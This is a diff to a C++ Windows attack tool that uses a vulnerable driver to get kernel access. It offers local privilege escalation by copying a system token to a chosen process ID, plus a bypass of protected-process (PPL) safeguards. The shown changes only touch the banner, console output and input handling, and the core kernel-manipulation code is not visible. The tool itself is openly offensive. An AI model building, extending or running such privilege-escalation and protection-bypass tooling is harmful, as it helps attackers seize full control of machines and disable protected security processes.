@@ -37,8 +37,14 @@ void print_banner_LPE() {
 
 void print_banner_PPL() {
     std::string S = R"(
-
-                                          
+           ___  ___  __      
+          / _ \/ _ \/ /      
+         / ___/ ___/ /__     
+   __   /_/  /_/  /____/     
+  / /  __ __/ _ \___ ____ ___
+ / _ \/ // / ___/ _ `(_-<(_-<
+/_.__/\_, /_/   \_,_/___/___/
+     /___/                                                    
 )";
 
     std::cout << S << std::endl;
@@ -60,14 +66,14 @@ void do_LPE(DriverOps * driver) {
     }
 
     print(OutputMode::_SUCCESS, "Got ntoskrnl information!");
-    std::cout << "Base Address: " << ntoskrnlInfo.ImageBase << std::endl;
+    std::cout << "[*] Base Address: " << ntoskrnlInfo.ImageBase << std::endl;
 
     DWORD64 systemProcess;
     DWORD64 targetProcess;
     ULONG64 targetPID = 0;
 
-    printf("Provide target PID: ");
-    scanf_s("%lu", &targetPID);
+    std::cout << "Provide target PID: ";
+    std::cin >> targetPID;
     if (targetPID <= 4) {
         throw std::string{ "Incorrect PID" };
     }
@@ -82,7 +88,7 @@ void do_LPE(DriverOps * driver) {
     }
     print(OutputMode::_SUCCESS, "Successfully copied token value to target!");
 
-    print(OutputMode::_SUCCESS, "PPL Done!");
+    print(OutputMode::_SUCCESS, "LPE Done!");
 }
 
 void do_PPLbyPass(DriverOps* driver) {
@@ -100,14 +106,14 @@ void do_PPLbyPass(DriverOps* driver) {
     }
 
     print(OutputMode::_SUCCESS, "Got ntoskrnl information!");
-    std::cout << "Base Address: " << ntoskrnlInfo.ImageBase << std::endl;
+    std::cout << "[*] Base Address: " << ntoskrnlInfo.ImageBase << std::endl;
 
     DWORD64 systemProcess;
     DWORD64 targetProcess;
     ULONG64 targetPID = 0;
 
-    printf("Provide target PID: ");
-    scanf_s("%lu", &targetPID);
+    std::cout << "Provide target PID: ";
+    std::cin >> targetPID;
     if (targetPID <= 4) {
         throw std::string{ "Incorrect PID" };
     }
@@ -146,11 +152,11 @@ int main() {
         }
         print(OutputMode::_SUCCESS, "Opened and got a handle to vulnerable driver!");
 
-        printf("\n");
-        print(OutputMode::_INFO, "Choose job:\n 1 - LPE\n 2 - PPL bypass");
+        std::cout << std::endl;
+        print(OutputMode::_INFO, "Choose task:\n 1 - LPE\n 2 - PPL bypass");
 
         int job = 0;
-        scanf_s("%d", &job);
+        std::cin >> job;
 
         if (job == 1) do_LPE(&driver);
         else if (job == 2) do_PPLbyPass(&driver);
